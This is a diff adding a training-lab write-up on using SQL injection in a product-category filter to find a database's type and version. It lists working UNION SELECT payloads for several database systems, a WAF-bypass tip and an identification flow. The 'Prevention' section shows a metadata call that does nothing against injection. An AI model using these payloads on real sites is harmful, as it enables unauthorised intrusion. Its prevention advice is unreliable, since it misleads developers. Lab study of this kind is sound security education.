@@ -1,0 +1,62 @@
+# SQL Injection Lab 6: Querying Database Version
+# Objective
+Determine the database type and version by exploiting a SQL injection vulnerability in the product category filter.
+
+# Solution
+    1. Identify Number of Columns
+      First determine the number of columns (same as previous labs):
+          GET /filter?category=Gifts' ORDER BY 1-- HTTP/1.1
+          GET /filter?category=Gifts' ORDER BY 2-- HTTP/1.1
+    2. Find String-Compatible Column
+          GET /filter?category=Gifts' UNION SELECT 'a','b'-- HTTP/1.1
+    3. Database Version Payloads
+      For MySQL/MariaDB:
+          GET /filter?category=Gifts' UNION SELECT @@version,NULL-- HTTP/1.1
+      For Microsoft SQL Server:
+          GET /filter?category=Gifts' UNION SELECT @@version,NULL-- HTTP/1.1
+      For Oracle:
+          GET /filter?category=Gifts' UNION SELECT banner,NULL FROM v$version-- HTTP/1.1
+      For PostgreSQL:
+          GET /filter?category=Gifts' UNION SELECT version(),NULL-- HTTP/1.1
+    4. Interpret Results
+        Example outputs:
+            MySQL: 8.0.29-0ubuntu0.20.04.3
+            Oracle: Oracle Database 19c Enterprise Edition...
+            PostgreSQL: PostgreSQL 12.12...
+
+# Key Techniques
+    Database Fingerprinting: Different version queries per DBMS
+    Error Analysis: Watching for DB-specific error messages
+    NULL Balancing: Maintaining correct column count
+
+# Prevention
+    String version = connection.getMetaData().getDatabaseProductVersion();
+
+# Troubleshooting
+    1. If version queries fail:
+         - Try alternative syntax: 
+             GET /filter?category=Gifts' UNION SELECT 1,version()-- HTTP/1.1
+         - Test different column positions for string output
+         - Add comments to bypass WAFs: `UNION/**/SELECT`
+
+    2. For Oracle databases:
+         - Always include `FROM dual` when needed
+         - Try multiple version tables:
+             SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'
+
+# Database Identification Flow
+    1. Test with `' UNION SELECT @@version--` 
+         → If works: MySQL/SQL Server
+    2. Test with `' UNION SELECT version()--` 
+         → If works: PostgreSQL
+    3. Test with `' UNION SELECT banner FROM v$version--` 
+         → If works: Oracle
+
+# Note 
+  1. Version information helps attackers:
+       - Identify vulnerable DB versions
+       - Craft version-specific exploits
+  2. In production systems:
+       - Restrict error messages
+       - Use generic error pages
+       - Implement WAF rules for version disclosure
